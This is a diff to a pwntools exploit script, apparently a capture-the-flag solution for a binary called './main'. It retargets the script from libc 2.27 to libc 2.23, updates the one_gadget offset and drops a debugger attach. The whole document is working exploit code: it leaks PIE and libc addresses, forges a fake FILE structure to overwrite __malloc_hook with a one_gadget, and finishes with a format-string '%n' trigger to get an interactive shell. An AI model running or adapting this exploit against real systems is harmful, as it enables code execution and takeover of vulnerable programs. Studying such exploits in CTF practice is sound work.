@@ -11,7 +11,7 @@ def FILE(_flags=0,_IO_read_ptr=0,_IO_read_end=0,_IO_read_base=0,_IO_write_base=0
 	fake_IO += flat([0,0,0,0xFFFFFFFF,0,0])
 	return fake_IO
 p = process('./main')
-libc = ELF('./libc-2.27.so',checksec=False)
+libc = ELF('./libc-2.23.so',checksec=False)
 p.recvuntil('location to ')
 pie = int(p.recvuntil('\n',drop=True),16) - 0x202010
 log.info('PIE:\t' + hex(pie))
@@ -27,13 +27,12 @@ log.info('LIBC:\t' + hex(libc_base))
 malloc_hook = libc_base + libc.sym['__malloc_hook']
 realloc_hook = libc_base + libc.sym['__realloc_hook']
 realloc = libc_base + libc.sym['realloc']
-one_gadget = 0x4F2C5 + libc_base
+one_gadget = 0x4526A + libc_base
 fake_IO_write = FILE(_flags = 0xFBAD8000,_IO_write_ptr = malloc_hook,_IO_write_end = malloc_hook + 8,_fileno = 0)
 payload  = p64(one_gadget) + p64(0)
 payload += p64(pie+0x202028)
 payload += fake_IO_write
 p.sendline(payload)
-gdb.attach(p)
 p.sendline('%n')
 p.interactive()
 
